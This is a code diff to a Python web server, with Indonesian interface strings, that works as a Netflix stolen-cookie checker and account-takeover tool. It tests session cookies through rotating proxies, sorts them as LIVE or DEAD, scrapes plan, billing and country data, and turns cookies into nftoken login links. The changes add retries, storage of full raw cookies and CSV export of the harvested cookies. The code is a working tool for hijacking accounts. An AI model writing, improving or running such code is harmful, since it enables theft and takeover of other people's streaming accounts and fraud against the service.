@@ -1,5 +1,8 @@
+import csv
 import http.server
+import io
 import json
+import logging
 import os
 import random
 import re
@@ -18,7 +21,16 @@ PORT = 8080
 PROXIES_FILE = "netflix_proxies.txt"
 DB_FILE = "netflix_suite.db"
 CONFIG_FILE = "suite_config.json"
+LOG_FILE = "suite.log"
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+
+# Setup logging
+logging.basicConfig(
+    filename=LOG_FILE,
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    encoding='utf-8'
+)
 
 QUERY_PARAMS = {
     "appVersion": "15.48.1",
@@ -85,6 +97,7 @@ COUNTRY_CODE_NAMES = {
 db_lock = threading.Lock()
 healthy_proxies = []
 proxy_lock = threading.Lock()
+server_start_time = time.time()
 
 def get_config():
     if not os.path.exists(CONFIG_FILE):
@@ -137,32 +150,69 @@ def save_history(entry_type, status, plan='', billing='', country='', route='', 
                 country,
                 route,
                 token_url,
-                raw_cookie[:500]
+                raw_cookie
             ))
             conn.commit()
             conn.close()
-        except Exception:
-            pass
+            logging.info(f"Save history: [{entry_type}] {status} - Plan: {plan} - Country: {country}")
+        except Exception as e:
+            logging.error(f"Error saving history: {e}")
 
-def get_history(limit=100):
+def get_history(limit=50, offset=0, search='', status='', plan=''):
     with db_lock:
         conn = sqlite3.connect(DB_FILE)
         c = conn.cursor()
-        c.execute('''
-            SELECT id, created_at, type, status, plan, billing, country, route, token_url
-            FROM history
-            ORDER BY id DESC
-            LIMIT ?
-        ''', (limit,))
+        query = 'SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie FROM history WHERE 1=1'
+        params = []
+
+        if search:
+            query += ' AND (country LIKE ? OR billing LIKE ? OR plan LIKE ?)'
+            params.extend([f'%{search}%', f'%{search}%', f'%{search}%'])
+        if status:
+            query += ' AND status = ?'
+            params.append(status)
+        if plan:
+            if plan == '4K':
+                query += ' AND plan LIKE "%4K%"'
+            else:
+                query += ' AND plan NOT LIKE "%4K%"'
+
+        # Count total
+        count_query = 'SELECT COUNT(*) FROM (' + query + ')'
+        c.execute(count_query, params)
+        total = c.fetchone()[0]
+
+        query += ' ORDER BY id DESC LIMIT ? OFFSET ?'
+        params.extend([limit, offset])
+
+        c.execute(query, params)
         rows = c.fetchall()
         conn.close()
-        return [
+
+        items = [
             {
                 "id": r[0], "created_at": r[1], "type": r[2], "status": r[3],
-                "plan": r[4], "billing": r[5], "country": r[6], "route": r[7], "token_url": r[8]
+                "plan": r[4], "billing": r[5], "country": r[6], "route": r[7],
+                "token_url": r[8], "raw_cookie": r[9]
             }
             for r in rows
         ]
+        return {"total": total, "items": items}
+
+def export_history_csv():
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute('SELECT id, created_at, type, status, plan, billing, country, route, token_url, raw_cookie FROM history ORDER BY id DESC')
+        rows = c.fetchall()
+        conn.close()
+
+        output = io.StringIO()
+        writer = csv.writer(output)
+        writer.writerow(["ID", "Waktu", "Tipe", "Status", "Plan", "Billing", "Negara", "Route", "Token URL", "Raw Cookie"])
+        for r in rows:
+            writer.writerow(r)
+        return output.getvalue()
 
 def get_analytics():
     with db_lock:
@@ -182,6 +232,7 @@ def clear_history():
         c.execute('DELETE FROM history')
         conn.commit()
         conn.close()
+        logging.info("History database cleared.")
 
 def load_proxies():
     if not os.path.exists(PROXIES_FILE):
@@ -318,31 +369,46 @@ def generate_nftoken(cookie_text, use_proxy=True):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={nid}"
 
-    proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
-    route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
+    # Auto-retry exponential backoff max 2 retries
+    max_retries = 2
+    last_err = None
 
-    res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=20, verify=False)
-    res.raise_for_status()
+    for attempt in range(max_retries + 1):
+        proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
+        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
-    data = res.json()
-    token_node = (
-        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
-        or {}
-    )
-    token = token_node.get("token")
-    expires = token_node.get("expires")
-    if not token:
-        save_history("nftoken", "DEAD", route=route, raw_cookie=cookie_text)
-        raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")
+        try:
+            res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=18, verify=False)
+            res.raise_for_status()
 
-    exp_str = "Unknown"
-    if isinstance(expires, (int, float)):
-        ts = expires // 1000 if len(str(int(expires))) == 13 else expires
-        exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
+            data = res.json()
+            token_node = (
+                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
+                or {}
+            )
+            token = token_node.get("token")
+            expires = token_node.get("expires")
+            if not token:
+                save_history("nftoken", "DEAD", route=route, raw_cookie=cookie_text)
+                raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")
 
-    token_url = f"https://netflix.com/?nftoken={token}"
-    save_history("nftoken", "LIVE", route=route, token_url=token_url, raw_cookie=cookie_text)
-    return token_url, exp_str, route
+            exp_str = "Unknown"
+            if isinstance(expires, (int, float)):
+                ts = expires // 1000 if len(str(int(expires))) == 13 else expires
+                exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
+
+            token_url = f"https://netflix.com/?nftoken={token}"
+            save_history("nftoken", "LIVE", route=route, token_url=token_url, raw_cookie=cookie_text)
+            return token_url, exp_str, route
+
+        except Exception as e:
+            last_err = e
+            if attempt < max_retries:
+                time.sleep(1.0 * (attempt + 1))
+                continue
+
+    save_history("nftoken", "ERROR", route=route, raw_cookie=cookie_text)
+    raise last_err
 
 def check_netflix_membership(cookie_text, use_proxy=True):
     cookies = extract_cookie_values(cookie_text)
@@ -357,70 +423,83 @@ def check_netflix_membership(cookie_text, use_proxy=True):
         'Referer': 'https://www.netflix.com/browse',
     }
 
-    proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
-    route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
+    max_retries = 2
+    last_err = None
 
-    try:
-        session = requests.Session()
-        ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
-        headers['Cookie'] = ck_header
+    for attempt in range(max_retries + 1):
+        proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
+        route = f"Proxy ({proxy_label})" if proxy_label else "Direct"
 
-        r = session.get(
-            'https://www.netflix.com/account/membership',
-            headers=headers,
-            proxies=proxies,
-            timeout=15,
-            allow_redirects=True,
-            verify=False
-        )
+        try:
+            session = requests.Session()
+            ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
+            headers['Cookie'] = ck_header
 
-        if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
-            save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
-            return {"live": False, "reason": "Cookie Expired / Terlempar ke Login.", "route": route}
+            r = session.get(
+                'https://www.netflix.com/account/membership',
+                headers=headers,
+                proxies=proxies,
+                timeout=14,
+                allow_redirects=True,
+                verify=False
+            )
 
-        html = r.text
-        plan_detected = 'Live (Standard/Basic)'
-        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or 'Premium' in html:
-            plan_detected = 'Premium 4K'
-        else:
-            plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
-            if plan_match:
-                plan_detected = plan_match.group(1).strip()
+            if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
+                save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
+                return {"live": False, "reason": "Cookie Expired / Terlempar ke Login.", "route": route}
 
-        date_match = re.search(
-            r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
-            html, re.DOTALL | re.I
-        )
-        billing = date_match.group(1).strip() if date_match else 'N/A'
+            html = r.text
+            plan_detected = 'Live (Standard/Basic)'
+            if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or 'Premium' in html:
+                plan_detected = 'Premium 4K'
+            else:
+                plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
+                if plan_match:
+                    plan_detected = plan_match.group(1).strip()
 
-        country_match = re.search(r'"(?:countryOfSignup|currentCountry|memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
-        country = normalize_country(country_match.group(1)) if country_match else 'Unknown'
+            date_match = re.search(
+                r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
+                html, re.DOTALL | re.I
+            )
+            billing = date_match.group(1).strip() if date_match else 'N/A'
 
-        editor_cookies = [
-            {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
-            for k, v in cookies.items()
-        ]
+            country_match = re.search(r'"(?:countryOfSignup|currentCountry|memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
+            country = normalize_country(country_match.group(1)) if country_match else 'Unknown'
 
-        save_history("checker", "LIVE", plan=plan_detected, billing=billing, country=country, route=route, raw_cookie=cookie_text)
+            editor_cookies = [
+                {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
+                for k, v in cookies.items()
+            ]
 
-        return {
-            "live": True,
-            "plan": plan_detected,
-            "billing": billing,
-            "country": country,
-            "cookies": editor_cookies,
-            "route": route
-        }
-    except Exception as e:
-        save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
-        return {"live": False, "reason": f"Request gagal: {str(e)}", "route": route}
+            save_history("checker", "LIVE", plan=plan_detected, billing=billing, country=country, route=route, raw_cookie=cookie_text)
+
+            return {
+                "live": True,
+                "plan": plan_detected,
+                "billing": billing,
+                "country": country,
+                "cookies": editor_cookies,
+                "route": route
+            }
+        except Exception as e:
+            last_err = e
+            if attempt < max_retries:
+                time.sleep(1.0 * (attempt + 1))
+                continue
+
+    save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
+    return {"live": False, "reason": f"Request gagal setelah retry: {str(last_err)}", "route": route}
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
     def do_GET(self):
-        if self.path in ("/", "/index.html") or self.path.startswith("/?"):
+        parsed = urllib.parse.urlparse(self.path)
+        path = parsed.path
+        qs = urllib.parse.parse_qs(parsed.query)
+
+        if path in ("/", "/index.html"):
             html_file = os.path.join(os.path.dirname(__file__), "index.html")
             if os.path.exists(html_file):
                 with open(html_file, "r", encoding="utf-8") as f:
@@ -432,14 +511,29 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(content)
 
-        elif self.path == "/api/pin/status":
+        elif path == "/api/health":
+            uptime = int(time.time() - server_start_time)
+            with proxy_lock:
+                h_proxies = len(healthy_proxies)
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            res = {
+                "status": "healthy",
+                "uptime_seconds": uptime,
+                "timestamp": datetime.now().isoformat(),
+                "healthy_proxies": h_proxies
+            }
+            self.wfile.write(json.dumps(res).encode("utf-8"))
+
+        elif path == "/api/pin/status":
             cfg = get_config()
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
             self.wfile.write(json.dumps({"enabled": bool(cfg.get("pin"))}).encode("utf-8"))
 
-        elif self.path == "/api/proxies":
+        elif path == "/api/proxies":
             all_p = load_proxies()
             with proxy_lock:
                 h_count = len(healthy_proxies) if healthy_proxies else len(all_p)
@@ -448,7 +542,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"total": len(all_p), "healthy": h_count}).encode("utf-8"))
 
-        elif self.path == "/api/proxies/detail":
+        elif path == "/api/proxies/detail":
             raw_text = ""
             if os.path.exists(PROXIES_FILE):
                 with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
@@ -460,14 +554,28 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"raw_text": raw_text, "list": p_list}).encode("utf-8"))
 
-        elif self.path == "/api/history":
-            rows = get_history()
+        elif path == "/api/history":
+            limit = int(qs.get("limit", [25])[0])
+            offset = int(qs.get("offset", [0])[0])
+            search = qs.get("search", [""])[0]
+            status = qs.get("status", [""])[0]
+            plan = qs.get("plan", [""])[0]
+
+            data = get_history(limit=limit, offset=offset, search=search, status=status, plan=plan)
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
-            self.wfile.write(json.dumps(rows).encode("utf-8"))
+            self.wfile.write(json.dumps(data).encode("utf-8"))
 
-        elif self.path == "/api/analytics":
+        elif path == "/api/history/export_csv":
+            csv_data = export_history_csv()
+            self.send_response(200)
+            self.send_header("Content-Type", "text/csv; charset=utf-8")
+            self.send_header("Content-Disposition", f"attachment; filename=netflix_history_{int(time.time())}.csv")
+            self.end_headers()
+            self.wfile.write(csv_data.encode("utf-8"))
+
+        elif path == "/api/analytics":
             an = get_analytics()
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
@@ -587,6 +695,7 @@ def run():
     socketserver.TCPServer.allow_reuse_address = True
     server = ThreadingSimpleServer(("", PORT), Handler)
     print(f"Server jalan: http://localhost:{PORT}")
+    logging.info(f"Server started on port {PORT}")
     server.serve_forever()
 
 if __name__ == "__main__":
